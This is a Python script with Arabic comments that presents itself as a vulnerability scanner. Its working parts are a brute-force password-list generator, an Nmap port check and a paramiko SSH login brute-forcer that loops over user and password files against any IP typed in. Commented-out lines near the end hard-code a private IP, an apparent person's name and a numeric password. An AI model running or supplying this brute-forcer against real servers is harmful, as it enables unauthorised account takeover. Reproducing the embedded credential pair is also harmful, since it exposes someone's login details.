
import nmap
import subprocess
import os
import itertools
import paramiko
import arabic_reshaper
from bidi.algorithm import get_display
import pprint
def format_arabic_text(text):
    reshaped_text = arabic_reshaper.reshape(text)
    bidi_text = get_display(reshaped_text)
    return bidi_text

# إنشاء قائمة كلمات المرور باستخدام بايثون
def create_password_list():
    try:
        output_path = os.path.expanduser('passList.txt')
        characters = 'abcde@#1234'
        min_length = 4
        max_length = 7

        with open(output_path, 'w') as f:
            for length in range(min_length, max_length + 1):
                for password in itertools.product(characters, repeat=length):
                    f.write(''.join(password) + '\n')

        print(f"تم إنشاء ملف كلمات المرور في: {output_path}")
        
        # عرض حجم الملف
        file_size = os.path.getsize(output_path) / (1024 * 1024)  # تحويل إلى ميجابايت
        print(f"حجم الملف: {file_size:.2f} MB")
        
    except Exception as e:
        print(f"حدث خطأ: {e}")

# دالة لتنفيذ أوامر الشبكة الأساسية
def network_commands():
    commands = {
        'ipconfig': 'عرض واجهات الشبكة وعناوين IP',
        'netstat -a': 'عرض جميع المنافذ المفتوحة',
    }
    
    for cmd, desc in commands.items():
        print(f"\nتنفيذ: {desc}")
        print("-" * 50)
        try:
            output = subprocess.check_output(cmd, shell=True).decode()
            print(output)
        except Exception as e:
            print(f"خطأ في تنفيذ {cmd}: {e}")

# دالة لفحص الثغرات باستخدام Nmap

# def nmap_scan(target):
#     try:
#         # فحص أساسي باستخدام Nmap
#         print(format_arabic_text(f"\nجاري فحص {target} باستخدام Nmap..."))

#         nm=nmap.PortScanner()
#         output=nm.scan(hosts=target,ports="443")
#         pprint.pprint(output)
#     except Exception as e:
#         print(f"خطأ في تنفيذ Nmap: {e}")



# def nmap_scan(target):
#     try:
#         print(format_arabic_text(f"\nجاري فحص {target} باستخدام Nmap..."))
        
#         nm = nmap.PortScanner()
#         output = nm.scan(hosts=target, ports="22")
        
#         # التحقق من حالة البورت
#         if target in output['scan']:
#             if 22 in output['scan'][target]['tcp']:
#                 port_state = output['scan'][target]['tcp'][22]['state']
#                 port_service = output['scan'][target]['tcp'][22]['name']
#                 port_version = output['scan'][target]['tcp'][22]['product']
#                 port_extra = output['scan'][target]['tcp'][22]['extrainfo']
                
#                 if port_state == 'open':
#                     print(format_arabic_text(f"\n[+] البورت 22 (SSH) مفتوح"))
#                     print(format_arabic_text(f"    - الخدمة: {port_service}"))
#                     print(format_arabic_text(f"    - البرنامج: {port_version}"))
#                     print(format_arabic_text(f"    - معلومات إضافية: {port_extra}"))
#                 else:
#                     print(format_arabic_text(f"\n[-] البورت 22 (SSH) مغلق"))
#             else:
#                 print(format_arabic_text("\n[-] لم يتم العثور على البورت 22"))
#         else:
#             print(format_arabic_text("\n[-] لم يتم العثور على الهدف"))

#     except Exception as e:
#         error_msg = f"خطأ في تنفيذ Nmap: {e}"
#         print(format_arabic_text(error_msg))

# استخدام الدالة

def nmap_scan(target, port):
    try:
        print(format_arabic_text(f"\nجاري فحص {target} باستخدام Nmap..."))
        
        nm = nmap.PortScanner()
        output = nm.scan(hosts=target, ports=str(port))
        
        # التحقق من حالة البورت
        if target in output['scan']:
            if port in output['scan'][target]['tcp']:
                port_state = output['scan'][target]['tcp'][port]['state']
                port_service = output['scan'][target]['tcp'][port]['name']
                port_version = output['scan'][target]['tcp'][port]['product']
                port_extra = output['scan'][target]['tcp'][port]['extrainfo']
                
                if port_state == 'open':
                    print(format_arabic_text(f"\n[+] البورت {port} ({port_service}) مفتوح"))
                    print(format_arabic_text(f"    - الخدمة: {port_service}"))
                    print(format_arabic_text(f"    - البرنامج: {port_version}"))
                    print(format_arabic_text(f"    - معلومات إضافية: {port_extra}"))
                else:
                    print(format_arabic_text(f"\n[-] البورت {port} ({port_service}) مغلق"))
            else:
                print(format_arabic_text(f"\n[-] لم يتم العثور على البورت {port}"))
        else:
            print(format_arabic_text("\n[-] لم يتم العثور على الهدف"))

    except Exception as e:
        error_msg = f"خطأ في تنفيذ Nmap: {e}"
        print(format_arabic_text(error_msg))



# دالة لتنفيذ هجمات كسر كلمات المرور باستخدام Paramiko بدلاً من Hydra
def ssh_bruteforce(target, users_file, passwords_file):
    try:
        print()
        print()
        print(format_arabic_text("===قراءة المستخدمين وكلمات المرور من الملفات مع تحديد الترميز==="))
        # قراءة المستخدمين وكلمات المرور من الملفات مع تحديد الترميز
        with open(users_file, encoding='utf-8') as uf:
            users = [user.strip() for user in uf.readlines()]
        with open(passwords_file, encoding='utf-8') as pf:
            passwords = [password.strip() for password in pf.readlines()]

        # محاولة الاتصال بخادم SSH باستخدام المستخدمين وكلمات المرور
        for user in users:
            for password in passwords:
                try:
                    user=str(user)
                    password=str(password)

                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(hostname=target, port=22, username=user, password=password)
                    success_msg = f'[+] نجح تسجيل الدخول: المستخدم: {user}, كلمة المرور: {password}'
                    print(format_arabic_text(success_msg))
                    ssh.close()
                    return
                except paramiko.AuthenticationException:
                    fail_msg = f'[-] فشل تسجيل الدخول: المستخدم: {user}, كلمة المرور: {password}'
                    print(format_arabic_text(fail_msg))
                except Exception as e:
                    error_msg = f"خطأ في تنفيذ SSH: {e}"
                    print(format_arabic_text(error_msg))
                
    except Exception as e:
        error_msg = f"خطأ في قراءة الملفات: {e}"
        print(format_arabic_text(error_msg))



# الدالة الرئيسية التي تجمع كل الوظائف
def main():
    print(format_arabic_text("=== برنامج فحص الثغرات الأمنية ==="))
    
    # إنشاء قائمة كلمات المرور
    # create_password_list()
    
    # # تنفيذ أوامر الشبكة
    # network_commands()
    
    # طلب عنوان IP الهدف من المستخدم
    target = str(input(format_arabic_text("\nأدخل عنوان IP الهدف: ")))
    
    # فحص الثغرات باستخدام Nmap
    nmap_scan(target ,21)
    
    # إعداد ملفات المستخدمين وكلمات المرور
   
    # users_file = input(format_arabic_text("أدخل مسار ملف المستخدمين: "))
    # passwords_file = input(format_arabic_text("أدخل مسار ملف كلمات المرور: "))
    users_file="user_file.txt"
    passwords_file="passList.txt"
    
    # # تنفيذ هجوم SSH باستخدام Paramiko
    ssh_bruteforce(target, users_file, passwords_file)

if __name__ == "__main__":
    main()



import paramiko

# def ssh_bruteforce(target, username, password):
#     try:
#         # محاولة الاتصال بخادم SSH باستخدام اسم المستخدم وكلمة المرور المحددين
#         ssh = paramiko.SSHClient()
#         ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
#         # محاولة الاتصال
#         ssh.connect(hostname=target, port=22, username=username, password=password)
#         print(f'[+] نجح تسجيل الدخول: المستخدم: {username}, كلمة المرور: {password}')
#         ssh.close()
#     except paramiko.AuthenticationException:
#         print(f'[-] فشل تسجيل الدخول: المستخدم: {username}, كلمة المرور: {password}')
#     except Exception as e:
#         print(f"خطأ في تنفيذ SSH: {e}")

# استخدام الدالة مع القيم المحددة
# ssh_bruteforce('10.0.2.213', 'زكريا السلمي', '733369770')
#  Get-Service -Name sshd
# Start-Service sshd
# net user
#  Stop-Service sshd
# الميزات الاختيارية

